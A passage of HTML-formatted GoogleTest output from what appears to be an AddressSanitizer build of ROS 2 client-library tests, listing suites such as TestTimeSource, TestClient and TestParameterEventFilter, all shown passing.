    <span id="cb150-421"><a href="#cb150-421" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.double_array_param_value</span></span>
    <span id="cb150-422"><a href="#cb150-422" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.double_array_param_value</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-423"><a href="#cb150-423" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.string_array_param_value</span></span>
    <span id="cb150-424"><a href="#cb150-424" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.string_array_param_value</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-425"><a href="#cb150-425" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 15 tests from Test_parameter_map_from <span class="er">(</span><span class="ex">13</span> ms total<span class="kw">)</span></span>
    <span id="cb150-426"><a href="#cb150-426" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-427"><a href="#cb150-427" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-428"><a href="#cb150-428" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 15 tests from 1 test case ran. <span class="er">(</span><span class="ex">14</span> ms total<span class="kw">)</span></span>
    <span id="cb150-429"><a href="#cb150-429" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">15</span> tests.</span>
    <span id="cb150-430"><a href="#cb150-430" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-431"><a href="#cb150-431" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 3 tests from 2 test cases.</span>
    <span id="cb150-432"><a href="#cb150-432" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-433"><a href="#cb150-433" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestClient</span>
    <span id="cb150-434"><a href="#cb150-434" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestClient.construction_and_destruction</span></span>
    <span id="cb150-435"><a href="#cb150-435" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestClient.construction_and_destruction</span> <span class="er">(</span><span class="ex">71</span> ms<span class="kw">)</span></span>
    <span id="cb150-436"><a href="#cb150-436" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestClient.construction_with_free_function</span></span>
    <span id="cb150-437"><a href="#cb150-437" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestClient.construction_with_free_function</span> <span class="er">(</span><span class="ex">36</span> ms<span class="kw">)</span></span>
    <span id="cb150-438"><a href="#cb150-438" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestClient <span class="er">(</span><span class="ex">107</span> ms total<span class="kw">)</span></span>
    <span id="cb150-439"><a href="#cb150-439" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-440"><a href="#cb150-440" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestClientSub</span>
    <span id="cb150-441"><a href="#cb150-441" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestClientSub.construction_and_destruction</span></span>
    <span id="cb150-442"><a href="#cb150-442" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestClientSub.construction_and_destruction</span> <span class="er">(</span><span class="ex">32</span> ms<span class="kw">)</span></span>
    <span id="cb150-443"><a href="#cb150-443" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestClientSub <span class="er">(</span><span class="ex">32</span> ms total<span class="kw">)</span></span>
    <span id="cb150-444"><a href="#cb150-444" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-445"><a href="#cb150-445" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-446"><a href="#cb150-446" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 3 tests from 2 test cases ran. <span class="er">(</span><span class="ex">162</span> ms total<span class="kw">)</span></span>
    <span id="cb150-447"><a href="#cb150-447" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">3</span> tests.</span>
    <span id="cb150-448"><a href="#cb150-448" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-449"><a href="#cb150-449" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 1 test from 1 test case.</span>
    <span id="cb150-450"><a href="#cb150-450" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-451"><a href="#cb150-451" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestMultiThreadedExecutor</span>
    <span id="cb150-452"><a href="#cb150-452" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMultiThreadedExecutor.timer_over_take</span></span>
    <span id="cb150-453"><a href="#cb150-453" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMultiThreadedExecutor.timer_over_take</span> <span class="er">(</span><span class="ex">687</span> ms<span class="kw">)</span></span>
    <span id="cb150-454"><a href="#cb150-454" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestMultiThreadedExecutor <span class="er">(</span><span class="ex">687</span> ms total<span class="kw">)</span></span>
    <span id="cb150-455"><a href="#cb150-455" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-456"><a href="#cb150-456" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-457"><a href="#cb150-457" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 1 test from 1 test case ran. <span class="er">(</span><span class="ex">710</span> ms total<span class="kw">)</span></span>
    <span id="cb150-458"><a href="#cb150-458" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">1</span> test.</span>
    <span id="cb150-459"><a href="#cb150-459" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-460"><a href="#cb150-460" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-461"><a href="#cb150-461" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-462"><a href="#cb150-462" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestSubscriptionTraits</span>
    <span id="cb150-463"><a href="#cb150-463" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSubscriptionTraits.is_serialized_callback</span></span>
    <span id="cb150-464"><a href="#cb150-464" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSubscriptionTraits.is_serialized_callback</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-465"><a href="#cb150-465" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSubscriptionTraits.callback_messages</span></span>
    <span id="cb150-466"><a href="#cb150-466" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSubscriptionTraits.callback_messages</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-467"><a href="#cb150-467" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestSubscriptionTraits <span class="er">(</span><span class="ex">0</span> ms total<span class="kw">)</span></span>
    <span id="cb150-468"><a href="#cb150-468" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-469"><a href="#cb150-469" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-470"><a href="#cb150-470" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">1</span> ms total<span class="kw">)</span></span>
    <span id="cb150-471"><a href="#cb150-471" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-472"><a href="#cb150-472" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-473"><a href="#cb150-473" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-474"><a href="#cb150-474" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-475"><a href="#cb150-475" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestNodeWithGlobalArgs</span>
    <span id="cb150-476"><a href="#cb150-476" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNodeWithGlobalArgs.local_arguments_before_global</span></span>
    <span id="cb150-477"><a href="#cb150-477" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNodeWithGlobalArgs.local_arguments_before_global</span> <span class="er">(</span><span class="ex">63</span> ms<span class="kw">)</span></span>
    <span id="cb150-478"><a href="#cb150-478" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNodeWithGlobalArgs.use_or_ignore_global_arguments</span></span>
    <span id="cb150-479"><a href="#cb150-479" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNodeWithGlobalArgs.use_or_ignore_global_arguments</span> <span class="er">(</span><span class="ex">59</span> ms<span class="kw">)</span></span>
    <span id="cb150-480"><a href="#cb150-480" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestNodeWithGlobalArgs <span class="er">(</span><span class="ex">122</span> ms total<span class="kw">)</span></span>
    <span id="cb150-481"><a href="#cb150-481" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-482"><a href="#cb150-482" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-483"><a href="#cb150-483" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">146</span> ms total<span class="kw">)</span></span>
    <span id="cb150-484"><a href="#cb150-484" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-485"><a href="#cb150-485" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-486"><a href="#cb150-486" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 10 tests from 1 test case.</span>
    <span id="cb150-487"><a href="#cb150-487" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-488"><a href="#cb150-488" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 10 tests from TestTimeSource</span>
    <span id="cb150-489"><a href="#cb150-489" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.detachUnattached</span></span>
    <span id="cb150-490"><a href="#cb150-490" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.detachUnattached</span> <span class="er">(</span><span class="ex">63</span> ms<span class="kw">)</span></span>
    <span id="cb150-491"><a href="#cb150-491" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.reattach</span></span>
    <span id="cb150-492"><a href="#cb150-492" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.reattach</span> <span class="er">(</span><span class="ex">34</span> ms<span class="kw">)</span></span>
    <span id="cb150-493"><a href="#cb150-493" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.ROS_time_valid_attach_detach</span></span>
    <span id="cb150-494"><a href="#cb150-494" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.ROS_time_valid_attach_detach</span> <span class="er">(</span><span class="ex">33</span> ms<span class="kw">)</span></span>
    <span id="cb150-495"><a href="#cb150-495" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.ROS_time_valid_wall_time</span></span>
    <span id="cb150-496"><a href="#cb150-496" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.ROS_time_valid_wall_time</span> <span class="er">(</span><span class="ex">30</span> ms<span class="kw">)</span></span>
    <span id="cb150-497"><a href="#cb150-497" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.ROS_time_valid_sim_time</span></span>
    <span id="cb150-498"><a href="#cb150-498" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.ROS_time_valid_sim_time</span> <span class="er">(</span><span class="ex">1122</span> ms<span class="kw">)</span></span>
    <span id="cb150-499"><a href="#cb150-499" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.clock</span></span>
    <span id="cb150-500"><a href="#cb150-500" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.clock</span> <span class="er">(</span><span class="ex">5103</span> ms<span class="kw">)</span></span>
    <span id="cb150-501"><a href="#cb150-501" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.callbacks</span></span>
    <span id="cb150-502"><a href="#cb150-502" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.callbacks</span> <span class="er">(</span><span class="ex">5127</span> ms<span class="kw">)</span></span>
    <span id="cb150-503"><a href="#cb150-503" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.callback_handler_erasure</span></span>
    <span id="cb150-504"><a href="#cb150-504" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.callback_handler_erasure</span> <span class="er">(</span><span class="ex">73</span> ms<span class="kw">)</span></span>
    <span id="cb150-505"><a href="#cb150-505" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.parameter_activation</span></span>
    <span id="cb150-506"><a href="#cb150-506" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.parameter_activation</span> <span class="er">(</span><span class="ex">5527</span> ms<span class="kw">)</span></span>
    <span id="cb150-507"><a href="#cb150-507" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimeSource.no_pre_jump_callback</span></span>
    <span id="cb150-508"><a href="#cb150-508" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimeSource.no_pre_jump_callback</span> <span class="er">(</span><span class="ex">60</span> ms<span class="kw">)</span></span>
    <span id="cb150-509"><a href="#cb150-509" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 10 tests from TestTimeSource <span class="er">(</span><span class="ex">17174</span> ms total<span class="kw">)</span></span>
    <span id="cb150-510"><a href="#cb150-510" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-511"><a href="#cb150-511" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-512"><a href="#cb150-512" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 10 tests from 1 test case ran. <span class="er">(</span><span class="ex">17195</span> ms total<span class="kw">)</span></span>
    <span id="cb150-513"><a href="#cb150-513" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">10</span> tests.</span>
    <span id="cb150-514"><a href="#cb150-514" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-515"><a href="#cb150-515" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 4 tests from 1 test case.</span>
    <span id="cb150-516"><a href="#cb150-516" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-517"><a href="#cb150-517" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestExternallyDefinedServices</span>
    <span id="cb150-518"><a href="#cb150-518" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.default_behavior</span></span>
    <span id="cb150-519"><a href="#cb150-519" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.default_behavior</span> <span class="er">(</span><span class="ex">72</span> ms<span class="kw">)</span></span>
    <span id="cb150-520"><a href="#cb150-520" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.extern_defined_uninitialized</span></span>
    <span id="cb150-521"><a href="#cb150-521" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.extern_defined_uninitialized</span> <span class="er">(</span><span class="ex">31</span> ms<span class="kw">)</span></span>
    <span id="cb150-522"><a href="#cb150-522" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.extern_defined_initialized</span></span>
    <span id="cb150-523"><a href="#cb150-523" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.extern_defined_initialized</span> <span class="er">(</span><span class="ex">32</span> ms<span class="kw">)</span></span>
    <span id="cb150-524"><a href="#cb150-524" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.extern_defined_destructor</span></span>
    <span id="cb150-525"><a href="#cb150-525" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExternallyDefinedServices.extern_defined_destructor</span> <span class="er">(</span><span class="ex">30</span> ms<span class="kw">)</span></span>
    <span id="cb150-526"><a href="#cb150-526" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestExternallyDefinedServices <span class="er">(</span><span class="ex">165</span> ms total<span class="kw">)</span></span>
    <span id="cb150-527"><a href="#cb150-527" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-528"><a href="#cb150-528" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-529"><a href="#cb150-529" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 4 tests from 1 test case ran. <span class="er">(</span><span class="ex">186</span> ms total<span class="kw">)</span></span>
    <span id="cb150-530"><a href="#cb150-530" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">4</span> tests.</span>
    <span id="cb150-531"><a href="#cb150-531" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-532"><a href="#cb150-532" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 6 tests from 1 test case.</span>
    <span id="cb150-533"><a href="#cb150-533" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-534"><a href="#cb150-534" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from TestParameterEventFilter</span>
    <span id="cb150-535"><a href="#cb150-535" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterEventFilter.full_by_type</span></span>
    <span id="cb150-536"><a href="#cb150-536" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterEventFilter.full_by_type</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-537"><a href="#cb150-537" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterEventFilter.full_by_name</span></span>
    <span id="cb150-538"><a href="#cb150-538" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterEventFilter.full_by_name</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-539"><a href="#cb150-539" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterEventFilter.empty</span></span>
    <span id="cb150-540"><a href="#cb150-540" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterEventFilter.empty</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-541"><a href="#cb150-541" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterEventFilter.singular</span></span>
    <span id="cb150-542"><a href="#cb150-542" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterEventFilter.singular</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-543"><a href="#cb150-543" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterEventFilter.multiple</span></span>
    <span id="cb150-544"><a href="#cb150-544" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterEventFilter.multiple</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-545"><a href="#cb150-545" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterEventFilter.validate_data</span></span>
    <span id="cb150-546"><a href="#cb150-546" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterEventFilter.validate_data</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-547"><a href="#cb150-547" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from TestParameterEventFilter <span class="er">(</span><span class="ex">3</span> ms total<span class="kw">)</span></span>
    <span id="cb150-548"><a href="#cb150-548" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-549"><a href="#cb150-549" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-550"><a href="#cb150-550" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 6 tests from 1 test case ran. <span class="er">(</span><span class="ex">3</span> ms total<span class="kw">)</span></span>
    <span id="cb150-551"><a href="#cb150-551" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">6</span> tests.</span>
    <span id="cb150-552"><a href="#cb150-552" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-553"><a href="#cb150-553" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 4 tests from 2 test cases.</span>
    <span id="cb150-554"><a href="#cb150-554" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-555"><a href="#cb150-555" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 3 tests from TestSubscription</span>
    <span id="cb150-556"><a href="#cb150-556" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSubscription.construction_and_destruction</span></span>
    <span id="cb150-557"><a href="#cb150-557" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSubscription.construction_and_destruction</span> <span class="er">(</span><span class="ex">67</span> ms<span class="kw">)</span></span>
    <span id="cb150-558"><a href="#cb150-558" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSubscription.various_creation_signatures</span></span>
    <span id="cb150-559"><a href="#cb150-559" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSubscription.various_creation_signatures</span> <span class="er">(</span><span class="ex">38</span> ms<span class="kw">)</span></span>
    <span id="cb150-560"><a href="#cb150-560" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSubscription.callback_bind</span></span>
    <span id="cb150-561"><a href="#cb150-561" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSubscription.callback_bind</span> <span class="er">(</span><span class="ex">136</span> ms<span class="kw">)</span></span>
    <span id="cb150-562"><a href="#cb150-562" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 3 tests from TestSubscription <span class="er">(</span><span class="ex">241</span> ms total<span class="kw">)</span></span>
    <span id="cb150-563"><a href="#cb150-563" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-564"><a href="#cb150-564" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestSubscriptionSub</span>
    <span id="cb150-565"><a href="#cb150-565" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSubscriptionSub.construction_and_destruction</span></span>
    <span id="cb150-566"><a href="#cb150-566" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSubscriptionSub.construction_and_destruction</span> <span class="er">(</span><span class="ex">36</span> ms<span class="kw">)</span></span>
    <span id="cb150-567"><a href="#cb150-567" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestSubscriptionSub <span class="er">(</span><span class="ex">36</span> ms total<span class="kw">)</span></span>
    <span id="cb150-568"><a href="#cb150-568" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-569"><a href="#cb150-569" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-570"><a href="#cb150-570" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 4 tests from 2 test cases ran. <span class="er">(</span><span class="ex">298</span> ms total<span class="kw">)</span></span>
    <span id="cb150-571"><a href="#cb150-571" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">4</span> tests.</span>
    <span id="cb150-572"><a href="#cb150-572" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-573"><a href="#cb150-573" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 7 tests from 1 test case.</span>
    <span id="cb150-574"><a href="#cb150-574" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-575"><a href="#cb150-575" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestDuration</span>
